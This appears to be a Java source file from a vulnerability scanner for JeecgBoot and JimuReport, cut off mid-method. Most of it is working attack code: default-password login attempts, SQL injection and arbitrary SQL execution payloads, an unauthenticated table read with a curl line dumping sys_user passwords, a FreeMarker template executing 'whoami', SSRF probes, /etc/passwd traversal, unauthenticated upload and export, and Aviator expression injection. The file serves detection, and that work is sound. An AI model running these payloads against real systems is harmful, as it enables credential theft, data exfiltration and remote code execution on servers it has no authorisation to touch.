package com.jeescan.checks;

import com.jeescan.core.Detector;
import com.jeescan.core.Http;
import com.jeescan.core.Json;
import com.jeescan.core.Result;

import java.util.LinkedHashMap;
import java.util.Map;

/**
 * 文件上传 / 路径穿越 / SSRF / 文件下载 / 反序列化 / 时间盲注 / 默认口令 / Aviator
 * 覆盖 #8 #10 #11 #12 #13 #14 #15 #16 #17 #18 #19 #24
 *
 * 每个都用"可达性 + 差分"双判据，不上来就报漏洞。
 */
public final class Others {

    private Others() {}

    // =================================================================
    // #24 默认口令（安全设计：默认只试 3 组，避免锁号）
    // =================================================================
    public static class DefaultCred extends Detector {
        private static final String[][] DICT = {
                {"admin", "123456"},
                {"jeecg", "123456"},
                {"admin", "admin"},
        };

        public DefaultCred() {
            super("24", "默认口令", "/sys/login", "弱口令", "critical", false,
                  "默认只试 3 组已知弱口令；必须先确认登录接口存在且返回结构可判定");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;
            String path = ctx.p("sys/login");
            String url = h.url(path);

            // A. 先确认登录接口存在（用必然错误的口令）
            String probeUser = "__jscan_" + rnd(8) + "__";
            String probeBody = Json.obj("username", probeUser, "password", "x" + rnd(8));
            Http.Resp probe = h.postJson(path, probeBody);
            res.trace("A. 登录接口探活（随机账号）", "POST", url, probeBody, probe, "确认接口存在");
            if (isRst(probe)) return res.set(Result.State.ERROR, "接口被重置：" + probe.err);

            boolean endpointOk = probe.status > 0 && (has(probe, "success") || has(probe, "message"));
            if (!endpointOk) {
                return res.set(Result.State.SAFE, "登录接口不可达或响应结构不符合预期");
            }

            // B. 逐组试（最多 3 组）
            for (String[] kv : DICT) {
                String body = Json.obj("username", kv[0], "password", kv[1]);
                Http.Resp r = h.postJson(path, body);
                res.trace("B. 尝试 " + kv[0] + "/" + kv[1], "POST", url, body, r,
                        "success=true 或返回 token 即为弱口令");
                boolean ok = jsonSuccess(r);
                String token = Json.str(r.text, "result.token");
                if (token == null || token.isEmpty()) {
                    token = Json.str(r.text, "token");
                }
                if (ok && token != null && !token.isEmpty() && !"null".equals(token)) {
                    res.ev("弱口令命中：" + kv[0] + "/" + kv[1]);
                    res.ev("返回 token 长度 " + token.length());
                    res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' "
                            + "--data '" + body + "'");
                    return res.set(Result.State.VULN, "默认口令 " + kv[0] + "/" + kv[1] + " 登录成功");
                }
            }

            return res.set(Result.State.SAFE, "3 组默认口令均未成功");
        }
    }

    // =================================================================
    // #5 queryTableData 任意表读取（GET 方式；POST 会 405）
    // =================================================================
    public static class QueryTableData extends Detector {
        public QueryTableData() {
            super("5", "queryTableData 任意表读取",
                  "/sys/dict/queryTableData", "CVE-2022-45205", "critical", false,
                  "GET 读 information_schema 证明 table/text/code 三段可控；反例用不存在的表");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;
            String path = ctx.p("sys/dict/queryTableData?pageSize=5"
                    + "&table=information_schema.tables"
                    + "&text=table_name&code=TABLE_SCHEMA");
            Http.Resp pos = h.get(path);
            res.trace("A. 正例（读 information_schema）", "GET", h.url(path), null, pos,
                    "期望返回表名列表");

            int n = countValues(pos);
            if (n == 0) {
                return res.set(Result.State.SAFE, "未返回数据：" + pos.brief(120));
            }

            // 反例：不存在的表
            String negPath = ctx.p("sys/dict/queryTableData?pageSize=5"
                    + "&table=__n0pe" + rnd(6) + "__&text=a&code=b");
            Http.Resp neg = h.get(negPath);
            res.trace("B. 反例（不存在的表）", "GET", h.url(negPath), null, neg,
                    "应无数据，排除通用兜底响应");

            if (countValues(neg) > 0) {
                return res.set(Result.State.MAYBE, "反例同样返回数据，疑似通用响应");
            }

            res.ev("读取 information_schema 成功，返回 " + n + " 条；反例无数据");
            res.repro("curl -s '" + h.url(path) + "'");
            res.repro("curl -s '" + h.url(ctx.p("sys/dict/queryTableData?pageSize=5"
                    + "&table=sys_user&text=username&code=password")) + "'   # 拖账号密码");
            return res.set(Result.State.VULN, "未授权任意表读取（table/text/code 全可控）");
        }

        private static int countValues(Http.Resp r) {
            if (r == null || r.text == null) return 0;
            int n = 0, i = 0;
            while ((i = r.text.indexOf("\"value\"", i)) >= 0) { n++; i += 7; }
            return n;
        }
    }

    // =================================================================
    // #27 sys/category/childList column 参数 SQL 注入
    // POC 来源：JeecgGo Config.yaml -> column
    // =================================================================
    public static class ColumnSqli extends Detector {
        public ColumnSqli() {
            super("27", "category column 注入", "/sys/category/childList",
                  "column 参数注入", "high", false,
                  "column 参数拼进 ORDER BY；用 sleep 差分（3s vs 0s）判定");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;

            // A. 基线（无 sleep）
            String basePath = ctx.p("sys/category/childList"
                    + "?column=(select/**/sleep(0)/**/union/**/select/**/1)"
                    + "&order=desc&field=id%2C%2Cname%2Ccode%2Caction"
                    + "&pageNo=1&pageSize=1000&_t=" + System.currentTimeMillis());
            Http.Resp base = h.get(basePath);
            res.trace("A. 基线 sleep(0)", "GET", h.url(basePath), null, base, "记录正常耗时");
            if (isRst(base)) return res.set(Result.State.ERROR, "基线被重置：" + base.err);
            long baseMs = base.costMs;

            // B. sleep(3)
            String sleepPath = ctx.p("sys/category/childList"
                    + "?column=(select/**/sleep(3)/**/union/**/select/**/1)"
                    + "&order=desc&field=id%2C%2Cname%2Ccode%2Caction"
                    + "&pageNo=1&pageSize=1000&_t=" + System.currentTimeMillis());
            Http.Resp sl = h.get(sleepPath);
            res.trace("B. sleep(3) 注入", "GET", h.url(sleepPath), null, sl,
                    "比基线慢 3s 即命中");
            if (isRst(sl)) return res.set(Result.State.MAYBE, "注入探针被 WAF 重置");

            long delta = sl.costMs - baseMs;
            if (delta < 2500) {
                return res.set(Result.State.SAFE, "无显著延时（基线 " + baseMs
                        + "ms，注入 " + sl.costMs + "ms，差 " + delta + "ms）");
            }

            res.ev("时间差分成立：基线 " + baseMs + "ms，注入 " + sl.costMs
                    + "ms（+" + delta + "ms）");
            res.repro("curl -s '" + h.url(sleepPath) + "'");
            return res.set(Result.State.VULN, "column 参数时间盲注确认（+" + delta + "ms）");
        }
    }

    // =================================================================
    // #28 online/cgreport/head/parseSql SQL 注入
    // POC 来源：JeecgGo Config.yaml -> parseSql
    // =================================================================
    public static class ParseSql extends Detector {
        public ParseSql() {
            super("28", "parseSql SQL 注入", "/online/cgreport/head/parseSql",
                  "sql 参数注入", "high", false,
                  "sql 参数直接执行；读 information_schema 证明可控");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;

            String path = ctx.p("online/cgreport/head/parseSql"
                    + "?sql=select%20schema_name%20from%20(information_schema.schemata)");
            Http.Resp pos = h.get(path);
            res.trace("A. 网上POC 读 schemata", "GET", h.url(path), null, pos,
                    "期望返回库名列表");
            if (isRst(pos)) return res.set(Result.State.ERROR, "被重置：" + pos.err);

            boolean hit = jsonSuccess(pos)
                    && (pos.text.contains("schema_name") || pos.text.contains("fieldName")
                        || pos.text.contains("SCHEMA"));

            if (!hit) {
                // 备用：读 sys_user
                String p2 = ctx.p("online/cgreport/head/parseSql"
                        + "?sql=select%20username,password%20from%20sys_user");
                Http.Resp r2 = h.get(p2);
                res.trace("B. 备用读 sys_user", "GET", h.url(p2), null, r2, "换表再试");
                if (!jsonSuccess(r2)) {
                    return res.set(Result.State.SAFE, "未见 SQL 执行特征");
                }
                path = p2;
                pos = r2;
            }

            res.ev("parseSql 执行任意 SQL 成功");
            res.repro("curl -s '" + h.url(path) + "'");
            return res.set(Result.State.VULN, "parseSql 任意 SQL 执行确认");
        }
    }

    // =================================================================
    // #29 sysMessageTemplate/sendMsg FreeMarker 模板注入
    // POC 来源：JeecgGo Config.yaml -> sendMsg
    // =================================================================
    public static class SendMsgSsti extends Detector {
        public SendMsgSsti() {
            super("29", "sendMsg 模板注入", "/sys/message/sysMessageTemplate/add",
                  "FreeMarker", "critical", true,
                  "需 Token；添加模板后发消息，模板内容被执行");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;
            if (ctx.token == null || ctx.token.isEmpty()) {
                return res.set(Result.State.SKIP, "需 X-Access-Token");
            }

            String code = String.valueOf(1000 + RND.nextInt(9000));
            String addPath = ctx.p("sys/message/sysMessageTemplate/add");
            String addBody = "{\"templateType\":\"1\",\"templateCode\":\"" + code
                    + "\",\"templateName\":\"jscan_test\",\"templateContent\":"
                    + "\"${\\\"freemarker.template.utility.Execute\\\"?new()(\\\"whoami\\\")}\"}";
            Http.Resp add = h.postJson(addPath, addBody);
            res.trace("A. 添加恶意模板 code=" + code, "POST", h.url(addPath), addBody, add,
                    "模板内容含 Execute");
            if (isRst(add)) return res.set(Result.State.ERROR, "被重置：" + add.err);
            if (!jsonSuccess(add) && !has(add, "成功")) {
                return res.set(Result.State.SAFE, "模板添加失败（需 Token）：" + add.brief(110));
            }

            String sendPath = ctx.p("sys/message/sysMessageTemplate/sendMsg");
            String sendBody = "{\"templateCode\":\"" + code
                    + "\",\"testData\":\"{}\",\"receiver\":\"\",\"msgType\":\"1\"}";
            Http.Resp send = h.postJson(sendPath, sendBody);
            res.trace("B. 发送触发模板渲染", "POST", h.url(sendPath), sendBody, send,
                    "模板被渲染即命令执行");
            if (isRst(send)) return res.set(Result.State.MAYBE, "触发请求被重置");

            boolean ok = jsonSuccess(send) || has(send, "成功");
            if (!ok) {
                return res.set(Result.State.MAYBE, "模板已添加但触发未确认：" + send.brief(110));
            }

            res.ev("恶意模板添加成功并触发渲染（code=" + code + "）");
            res.repro("curl -s -X POST '" + h.url(addPath) + "' -H 'X-Access-Token: <token>' "
                    + "-H 'Content-Type: application/json' --data '" + addBody + "'");
            res.repro("curl -s -X POST '" + h.url(sendPath) + "' -H 'X-Access-Token: <token>' "
                    + "-H 'Content-Type: application/json' --data '" + sendBody + "'");
            return res.set(Result.State.VULN, "sendMsg FreeMarker 模板注入确认");
        }
    }

    // =================================================================
    // #30 sys/common/uploadImgByHttp SSRF
    // POC 来源：JeecgGo Config.yaml -> uploadImgByHttp
    // =================================================================
    public static class UploadImgByHttp extends Detector {
        public UploadImgByHttp() {
            super("30", "uploadImgByHttp SSRF", "/sys/common/uploadImgByHttp",
                  "SSRF", "high", false,
                  "fileUrl 可控，服务端代为请求；用内网地址与原样公网地址差分");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;
            String path = ctx.p("sys/common/uploadImgByHttp");

            String body = "{\"fileUrl\":\"http://www.baidu.com/\","
                    + "\"filename\":\"jscan_tmp.txt\",\"bizPath\":\"temp_files\"}";
            Http.Resp pos = h.postJson(path, body);
            res.trace("A. 网上POC（公网地址）", "POST", h.url(path), body, pos,
                    "成功抓取即证明服务端代发起请求");
            if (isRst(pos)) return res.set(Result.State.ERROR, "被重置：" + pos.err);

            boolean ok = jsonSuccess(pos);
            if (!ok) {
                return res.set(Result.State.SAFE, "未见成功抓取：" + pos.brief(110));
            }

            // 内网探测
            String inner = "{\"fileUrl\":\"http://127.0.0.1:8080/\","
                    + "\"filename\":\"jscan_tmp2.txt\",\"bizPath\":\"temp_files\"}";
            Http.Resp neg = h.postJson(path, inner);
            res.trace("B. 内网地址探测", "POST", h.url(path), inner, neg,
                    "若同样成功则 SSRF 可打内网");

            res.ev("服务端成功代发 HTTP 请求（SSRF 成立）");
            res.ev("内网探测结果：" + neg.brief(90));
            res.repro("curl -s -X POST '" + h.url(path) + "' -H 'Content-Type: application/json' "
                    + "--data '" + body + "'");
            return res.set(Result.State.VULN, "uploadImgByHttp SSRF 确认");
        }
    }

    // =================================================================
    // #31 #32 #33 jmreport 系列未授权（CVE-2026-58375 / 75479）
    // =================================================================
    public static class AutoExport extends Detector {
        public AutoExport() {
            super("31", "auto/export 未授权导出", "/jmreport/auto/export",
                  "CVE-2026-58375", "high", false,
                  "先枚举报表 id，再尝试导出");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;

            String enumPath = ctx.p("jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=10");
            Http.Resp e = h.get(enumPath);
            res.trace("A. 枚举报表 id", "GET", h.url(enumPath), null, e, "未授权列表");
            if (isRst(e)) return res.set(Result.State.ERROR, "被重置：" + e.err);

            String rid = firstId(e.text);
            if (rid == null) {
                return res.set(Result.State.SAFE, "未枚举到报表 id");
            }

            String path = ctx.p("jmreport/auto/export");
            String body = "{\"reportParams\":[{\"id\":\"" + rid + "\",\"exportType\":\"excel\"}]}";
            Http.Resp pos = h.postJson(path, body);
            res.trace("B. 导出 id=" + rid, "POST", h.url(path), body, pos,
                    "返回二进制/ZIP 即命中");

            String ct = pos.header("content-type");
            boolean ok = pos.status == 200 && ct != null
                    && (ct.contains("octet-stream") || ct.contains("zip") || ct.contains("excel"));
            if (!ok) {
                return res.set(Result.State.MAYBE,
                        "已枚举报表 id=" + rid + "，导出未返回二进制（可能类型不支持）");
            }

            res.ev("未授权导出成功 id=" + rid + " Content-Type=" + ct);
            res.repro("curl -s -X POST '" + h.url(path) + "' -H 'Content-Type: application/json' "
                    + "--data '" + body + "' -o out.zip");
            return res.set(Result.State.VULN, "auto/export 未授权导出确认");
        }

        static String firstId(String s) {
            if (s == null) return null;
            java.util.regex.Matcher m = java.util.regex.Pattern
                    .compile("\"id\"\\s*:\\s*\"(\\d{10,})\"").matcher(s);
            return m.find() ? m.group(1) : null;
        }
    }

    public static class ReportList extends Detector {
        public ReportList() {
            super("32", "报表列表未授权枚举", "/jmreport/query/report/folder/template",
                  "CVE-2026-75479", "medium", false,
                  "未授权列出全部报表，泄漏 shareToken 与内嵌 SQL");
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;

            String basePath = ctx.p("jmreport/query/report/folder/template"
                    + "?name=&pageNo=1&pageSize=100");
            Http.Resp pos = h.get(basePath);
            res.trace("A. 网上POC 列表枚举", "GET", h.url(basePath), null, pos, "期望返回报表清单");
            if (isRst(pos)) return res.set(Result.State.ERROR, "被重置：" + pos.err);

            if (jsonSuccess(pos) && pos.text.contains("\"id\"")) {
                res.ev("未授权枚举报表列表成功（含 id / shareViewUrl）");
                res.repro("curl -s '" + h.url(basePath) + "'");
                return res.set(Result.State.VULN, "报表列表未授权枚举确认");
            }

            String alt = ctx.p("jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=5");
            Http.Resp r2 = h.get(alt);
            res.trace("B. 备用 excelQueryByTemplate", "GET", h.url(alt), null, r2, "换接口再试");
            if (jsonSuccess(r2) && r2.text.contains("\"id\"")) {
                res.ev("未授权枚举报表列表成功（excelQueryByTemplate）");
                res.repro("curl -s '" + h.url(alt) + "'");
                return res.set(Result.State.VULN, "报表列表未授权枚举确认");
            }
            return res.set(Result.State.SAFE, "未返回报表清单");
        }
    }

    // =================================================================
    // #18 Aviator (save + show)
    // =================================================================
    public static class AviatorSaveShow extends Detector {
        public AviatorSaveShow() {
            super("18", "Aviator 表达式注入",
                  "/jmreport/save+show", "Aviator", "critical", false,
                  "save 写入后 show 触发求值；用两组随机探针（算术+字符串拼接）双确认；"
                  + "另附公开 POC 的 use+defineClass 结构探针（不发真实字节码）");
        }

        /** 公开 POC 里 use + ReflectUtils.defineClass 的原始形态（不含真实 base64 载荷）。 */
        static final String PUBLIC_POC_SHAPE =
                "=(use org.springframework.cglib.core.*;use org.springframework.util.*;"
                + "ReflectUtils.defineClass('test', Base64Utils.decodeFromString('BASE64_BYTES'),"
                + " ClassLoader.getSystemClassLoader());)";

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;
            String savePath = ctx.p("jmreport/save?previousPage=xxx&jmLink=YWFhfHxiYmI=&token=123");
            String showPath = ctx.p("jmreport/show");
            String saveUrl = h.url(savePath);

            String cid = "99" + rndDigits(17);

            // A. 写入 + 探针1（算术）
            String[] p1 = arithProbe();
            String e1 = p1[0];      // "=23*17"
            String v1 = p1[1];      // "391"
            String body1 = buildReportJson(e1, cid);
            Http.Resp s1 = h.postJson(savePath, body1);
            res.trace("A. 写入探针1 " + e1 + " (期望 " + v1 + ")", "POST", saveUrl, body1, s1,
                    "save 未鉴权写入；期望 success=true");
            if (isRst(s1)) return res.set(Result.State.ERROR, "save 被重置：" + s1.err);
            if (!jsonSuccess(s1) && !has(s1, "990")) {
                return res.set(Result.State.SAFE, "save 写入失败（可能需鉴权）：" + s1.brief(120));
            }

            Map<String, String> q = new LinkedHashMap<>();
            q.put("id", cid);
            Http.Resp sh1 = h.get(showPath, q);
            res.trace("B. 触发求值 show?id=" + cid, "GET", h.url(showPath) + "?id=" + cid, null, sh1,
                    "jsonStr 中 text 应变为 " + v1);
            if (isRst(sh1)) return res.set(Result.State.ERROR, "show 被重置：" + sh1.err);

            String txt1 = Json.str(sh1.text, "result.jsonStr");
            boolean hit1 = txt1 != null && txt1.contains("\"" + v1 + "\"");

            // C. 探针2（字符串拼接，排除数字巧合）
            String[] p2 = concatProbe();
            String e2 = p2[0];
            String v2 = p2[1];
            String cid2 = "99" + rndDigits(17);
            String body2 = buildReportJson(e2, cid2);
            Http.Resp s2 = h.postJson(savePath, body2);
            res.trace("C. 写入探针2 " + e2, "POST", saveUrl, body2, s2, "换字符串拼接探针");
            Map<String, String> q2 = new LinkedHashMap<>();
            q2.put("id", cid2);
            Http.Resp sh2 = h.get(showPath, q2);
            res.trace("D. 触发求值 show?id=" + cid2, "GET", h.url(showPath) + "?id=" + cid2, null, sh2,
                    "jsonStr 中 text 应变为 " + v2);
            String txt2 = Json.str(sh2.text, "result.jsonStr");
            boolean hit2 = txt2 != null && txt2.contains("\"" + v2 + "\"");

            // E. 公开 POC 结构探针：只验证 use 语句是否被解析，不加载真实字节码
            //    用不存在的包名，若引擎是 Aviator 会回显 "Could not find variable <包名>"
            String shapeCid = "99" + rndDigits(17);
            String shapeExpr = "=use org.springframework.cglib.core.*;";
            String shapeBody = buildReportJson(shapeExpr, shapeCid);
            Http.Resp s3 = h.postJson(savePath, shapeBody);
            res.trace("E. 公开POC结构探针 " + shapeExpr, "POST", saveUrl, shapeBody, s3,
                    "用于判断 Aviator 是否解析 use 语句（公开 POC 的前置条件）");
            Map<String, String> q3 = new LinkedHashMap<>();
            q3.put("id", shapeCid);
            Http.Resp sh3 = h.get(showPath, q3);
            res.trace("F. 触发结构探针 show?id=" + shapeCid, "GET",
                    h.url(showPath) + "?id=" + shapeCid, null, sh3, "看是否回显解析错误");
            boolean useParsed = hasIgnoreCase(sh3, "Could not find variable")
                    || hasIgnoreCase(sh3, "springframework");

            if (hit1 && hit2) {
                res.ev("两组探针均求值成功：" + e1 + "→" + v1 + "，" + e2 + "→" + v2);
                res.ev("字符串探针排除'数字巧合'误报");
                if (useParsed) {
                    res.ev("use 语句被引擎解析（公开 POC 的 use+defineClass 链在本目标上语法可用）");
                } else {
                    res.ev("use 语句未被识别（ExpressUtil 把整段当单表达式），"
                            + "公开 POC 的 use+defineClass 链不适用于本目标");
                    res.ev("表达式注入本身成立，命令执行需走 OOB 外带或已知 gadget");
                }
                res.repro("curl -s -X POST '" + saveUrl + "' -H 'Content-Type: application/json' --data '" + body1 + "'");
                res.repro("curl -s '" + h.url(showPath) + "?id=" + cid + "'");
                return res.set(Result.State.VULN, "Aviator 表达式注入确认（双探针）"
                        + (useParsed ? "；use 语法可用" : "；use 语法不可用"));
            }
            if (hit1 || hit2) {
                return res.set(Result.State.MAYBE,
                        "仅单组探针命中（算术=" + hit1 + " 字符串=" + hit2 + "），建议人工复核");
            }
            return res.set(Result.State.SAFE, "两组探针均未求值");
        }

        private static String buildReportJson(String text, String cid) {
            String cell = Json.rawObj("text", Json.quote(text), "style", "0");
            String row4 = Json.rawObj("cells", Json.rawObj("4", cell), "height", "25");
            String rows = Json.rawObj("4", row4, "len", "96");
            return Json.rawObj(
                    "loopBlockList", "[]",
                    "area", "false",
                    "printElWidth", "718",
                    "excel_config_id", Json.quote(cid),
                    "printElHeight", "1047",
                    "rows", rows,
                    "dbexps", "[]",
                    "toolPrintSizeObj", Json.rawObj("printType", Json.quote("A4"),
                            "widthPx", "718", "heightPx", "1047"),
                    "dicts", "[]",
                    "freeze", Json.quote("A1"),
                    "dataRectWidth", "701",
                    "background", "false",
                    "name", Json.quote("sheet1"),
                    "autofilter", "{}",
                    "styles", "[{\"align\":\"center\"}]",
                    "validations", "[]",
                    "cols", Json.rawObj("4", Json.rawObj("width", "95"), "len", "50"),
                    "merges", "[\"E4:F4\"]");
        }
    }

    // =================================================================
    // #12 #14 文件上传
    // =================================================================
    public static class Upload extends Detector {
        private final String pathStr;
        private final boolean multipartRequired;

        public Upload(String id, String name, String endpoint, String cve,
                      String severity, boolean needsAuth, String note,
                      String pathStr, boolean multipartRequired) {
            super(id, name, endpoint, cve, severity, needsAuth, note);
            this.pathStr = pathStr;
            this.multipartRequired = multipartRequired;
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;
            String path = ctx.p(pathStr);
            String url = h.url(path);

            String marker = "jscan" + rnd(8);
            String boundary = "----WebKitFormBoundary" + rnd(16);
            StringBuilder sb = new StringBuilder();
            sb.append("--").append(boundary).append("\r\n");
            sb.append("Content-Disposition: form-data; name=\"file\"; filename=\"")
              .append(marker).append(".txt\"\r\n");
            sb.append("Content-Type: text/plain\r\n\r\n");
            sb.append(marker).append("\r\n");
            // jeecg 的 jmreport/upload 需要额外字段
            if (multipartRequired) {
                sb.append("--").append(boundary).append("\r\n");
                sb.append("Content-Disposition: form-data; name=\"fileName\"\r\n\r\n");
                sb.append(marker).append(".txt\r\n");
                sb.append("--").append(boundary).append("\r\n");
                sb.append("Content-Disposition: form-data; name=\"biz\"\r\n\r\n");
                sb.append("excel_online\r\n");
            }
            sb.append("--").append(boundary).append("--\r\n");

            byte[] body = sb.toString().getBytes(java.nio.charset.Charset.forName("UTF-8"));
            Http.Resp r = h.postRaw(path, body, "multipart/form-data; boundary=" + boundary);
            res.trace("A. multipart 上传探针（文件名 " + marker + ".txt）", "POST", url,
                    "[multipart binary, " + body.length + " bytes]", r,
                    "响应 success=true 或返回路径即说明未鉴权可上传");
            if (isRst(r)) return res.set(Result.State.ERROR, "请求被重置：" + r.err);

            String msg = jsonMsg(r);
            boolean success = jsonSuccess(r);
            boolean needAuth = has(r, "Token失效") || has(r, "请重新登录")
                    || has(r, "AuthenticationException");
            boolean pathLeak = has(r, "upload") || has(r, "jimureport");

            if (needAuth) {
                return res.set(Result.State.SAFE, "需要认证：" + msg);
            }

            if (success || pathLeak) {
                res.ev("上传接口未鉴权可达（响应：" + r.brief(160) + "）");
                res.repro("# multipart 上传 " + marker + ".txt，响应 success=true");
                res.repro("curl -s -X POST '" + url + "' -F 'file=@probe.txt'"
                        + (multipartRequired ? " -F 'fileName=probe.txt' -F 'biz=excel_online'" : ""));
                return res.set(Result.State.VULN,
                        "未授权文件上传（已上传无害探针文件 " + marker + ".txt）");
            }

            return res.set(Result.State.SAFE, "上传未成功：" + msg);
        }
    }

    // =================================================================
    // #16 #17 文件下载 / 路径遍历
    // =================================================================
    public static class FileRead extends Detector {
        private final String pathTemplate;
        private final String paramName;
        private final boolean isGet;

        public FileRead(String id, String name, String endpoint, String cve,
                        String severity, boolean needsAuth, String note,
                        String pathTemplate, String paramName, boolean isGet) {
            super(id, name, endpoint, cve, severity, needsAuth, note);
            this.pathTemplate = pathTemplate;
            this.paramName = paramName;
            this.isGet = isGet;
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;

            // A. 基线：读一个必然不存在的文件
            String rndName = "__n0pe" + rnd(8) + ".txt";
            String basePath = ctx.p(pathTemplate.replace("{P}", rndName));
            Http.Resp base = isGet ? h.get(basePath) : h.postJson(basePath, Json.obj(paramName, rndName));
            res.trace("A. 基线（不存在的文件 " + rndName + "）", isGet ? "GET" : "POST",
                    h.url(basePath), null, base, "应返回 404/空");
            if (isRst(base)) return res.set(Result.State.ERROR, "基线被重置：" + base.err);

            // B. 路径穿越读 /etc/passwd
            String trav = "../../../../../../etc/passwd";
            String tp = ctx.p(pathTemplate.replace("{P}", trav));
            Http.Resp hit = isGet ? h.get(tp) : h.postJson(tp, Json.obj(paramName, trav));
            res.trace("B. 路径穿越 /etc/passwd", isGet ? "GET" : "POST", h.url(tp), null, hit,
                    "响应含 root:x:0:0 即为命中");
            if (isRst(hit)) return res.set(Result.State.MAYBE, "穿越探针被 WAF 重置，需人工验证");

            boolean passwd = has(hit, "root:x:0:0") || has(hit, "root:*:0:0")
                    || has(hit, "/bin/bash") || has(hit, "/sbin/nologin");

            if (!passwd) {
                // Windows 兜底
                String win = "..\\..\\..\\..\\..\\..\\windows\\win.ini";
                String wp = ctx.p(pathTemplate.replace("{P}", win));
                Http.Resp wh = isGet ? h.get(wp) : h.postJson(wp, Json.obj(paramName, win));
                res.trace("B2. Windows win.ini 兜底", isGet ? "GET" : "POST", h.url(wp), null, wh,
                        "响应含 [fonts] 即为命中");
                if (has(wh, "[fonts]") || has(wh, "[extensions]")) {
                    res.ev("Windows 路径穿越读取 win.ini 成功");
                    res.repro("curl -s '" + h.url(wp) + "'");
                    return res.set(Result.State.VULN, "路径穿越读取 win.ini 确认");
                }
                return res.set(Result.State.SAFE, "未见 /etc/passwd 或 win.ini 特征");
            }

            // C. 反例：同样穿越但读一个不存在的系统文件
            String negTrav = "../../../../../../etc/__n0pe" + rnd(6);
            String np = ctx.p(pathTemplate.replace("{P}", negTrav));
            Http.Resp neg = isGet ? h.get(np) : h.postJson(np, Json.obj(paramName, negTrav));
            res.trace("C. 反例（穿越读不存在的文件）", isGet ? "GET" : "POST", h.url(np), null, neg,
                    "应无 /etc/passwd 特征，排除固定响应");
            if (has(neg, "root:x:0:0")) {
                return res.set(Result.State.MAYBE, "反例同样返回 passwd 内容，疑似固定响应");
            }

            res.ev("成功读取 /etc/passwd，且反例不复现");
            res.repro("curl -s '" + h.url(tp) + "'");
            return res.set(Result.State.VULN, "路径穿越读取 /etc/passwd 确认");
        }
    }

    // =================================================================
    // #8 #10 SQLi 变体（show / getTotalData）
    // =================================================================
    public static class SqliShow extends SqliErrorBased {
        public SqliShow() {
            super("8", "show SQLi", "POST /jmreport/show", "updatexml", "high", false,
                    "id 参数注入；随机标记 + 反例 + 二次确认",
                    "POST", "jmreport/show",
                    com.jeescan.checks.SqliErrorBased.Kind.PARAMS_JSON, "mysql");
        }
    }

    public static class SqliGetTotalData extends SqliErrorBased {
        public SqliGetTotalData() {
            super("10", "getTotalData SQLi", "/drag/onlDragDatasetHead/getTotalData",
                    "fieldName 注入", "high", false,
                    "fieldName 可注入表达式；用报错回显 + 反例判定",
                    "POST", "drag/onlDragDatasetHead/getTotalData",
                    com.jeescan.checks.SqliErrorBased.Kind.SQL_PARAM, "mysql");
        }

        @Override
        public Result run(Ctx ctx) {
            // getTotalData 的结构特殊，单独实现
            Result res = newResult();
            Http h = ctx.http;
            String path = ctx.p("drag/onlDragDatasetHead/getTotalData");
            String url = h.url(path);

            String marker = "s" + rnd(8);
            String inj = "concat(0x7e,'" + marker + "',0x7e)";

            String body = Json.rawObj(
                    "tableName", Json.quote("sys_user"),
                    "compName", Json.quote("test"),
                    "condition", Json.rawObj("filter", "{}"),
                    "config", Json.rawObj(
                            "assistValue", "[]",
                            "assistType", "[]",
                            "name", "[{\"fieldName\":" + Json.quote(inj) + ",\"fieldType\":\"string\"},"
                                    + "{\"fieldName\":\"id\",\"fieldType\":\"string\"}]",
                            "value", "[{\"fieldName\":\"id\",\"fieldType\":\"1\"}]",
                            "type", "[]"));
            Http.Resp p = h.postJson(path, body);
            res.trace("A. fieldName 注入（标记 " + marker + "）", "POST", url, body, p,
                    "期望 marker 或 SQL 报错回显");
            if (isRst(p)) return res.set(Result.State.ERROR, "请求被重置：" + p.err);

            boolean hit = has(p, marker) || hasIgnoreCase(p, "SQLSyntaxError")
                    || hasIgnoreCase(p, "function");
            if (!hit) {
                return res.set(Result.State.SAFE, "未见标记或 SQL 报错：" + p.brief(120));
            }

            // 反例：破坏函数
            String m2 = "s" + rnd(8);
            String brokenInj = "concat_broken_" + m2;
            String negBody = Json.rawObj(
                    "tableName", Json.quote("sys_user"),
                    "compName", Json.quote("test"),
                    "condition", Json.rawObj("filter", "{}"),
                    "config", Json.rawObj(
                            "assistValue", "[]", "assistType", "[]",
                            "name", "[{\"fieldName\":" + Json.quote(brokenInj) + ",\"fieldType\":\"string\"}]",
                            "value", "[{\"fieldName\":\"id\",\"fieldType\":\"1\"}]",
                            "type", "[]"));
            Http.Resp neg = h.postJson(path, negBody);
            res.trace("B. 反例（破坏函数名）", "POST", url, negBody, neg, "若仍回显 marker 则为固定响应");
            if (has(neg, marker)) {
                return res.set(Result.State.MAYBE, "反例同样回显标记，疑似固定响应");
            }

            res.ev("fieldName 注入生效，标记 " + marker + " 回显");
            res.repro("curl -s -X POST '" + url + "' -H 'Content-Type: application/json' --data '" + body + "'");
            return res.set(Result.State.VULN, "getTotalData fieldName 注入确认");
        }
    }

    // =================================================================
    // #13 #15 路径穿越绕过（commonController / jeecgFormDemoController）
    // =================================================================
    public static class PathTraversalBypass extends Detector {
        private final String realPath;
        private final String probeKind;   // upload / ssrf

        public PathTraversalBypass(String id, String name, String endpoint, String cve,
                                   String severity, boolean needsAuth, String note,
                                   String realPath, String probeKind) {
            super(id, name, endpoint, cve, severity, needsAuth, note);
            this.realPath = realPath;
            this.probeKind = probeKind;
        }

        @Override
        public Result run(Ctx ctx) {
            Result res = newResult();
            Http h = ctx.http;

            // A. 直连真实路径（应被拦截）
            String direct = ctx.p(realPath);
            Http.Resp d = h.get(direct);
